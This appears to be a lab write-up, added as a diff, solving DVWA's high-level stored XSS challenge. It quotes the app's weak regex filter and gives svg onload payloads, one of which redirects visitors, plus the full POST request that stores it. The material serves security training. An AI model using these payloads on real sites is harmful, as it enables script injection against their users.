@@ -1,0 +1,52 @@
+#+TITLE: DVWA - XSS Stored High
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  The way the fields are escaped is now different.
+
+  #+begin_src php
+// Sanitize message input
+$message = strip_tags( addslashes( $message ) );
+$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+$message = htmlspecialchars( $message );
+  #+end_src
+
+  #+begin_src php
+// Sanitize name input
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+  #+end_src
+  
+* Solution
+  We can use javascript events to trigger the execution of JS code within the ~name~ field.
+
+  #+begin_example
+<svg/onload=alert(1337)>
+  #+end_example
+
+  To actually get the redirect we use the following payload
+
+  #+begin_example
+<svg/onload=window.location.replace('https://leonardotamiano.xyz');>
+  #+end_example
+  
+  The HTTP request is the following one
+  
+  #+begin_example
+POST /vulnerabilities/xss_s/ HTTP/1.1
+Host: evil
+Content-Length: 113
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_s/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=qnb8tctsqlju8alqdo6olclav4; security=high
+Connection: close
+
+txtName=<svg/onload=window.location.replace('https://leonardotamiano.xyz');>&mtxMessage=yo&btnSign=Sign+Guestbook
+  #+end_example
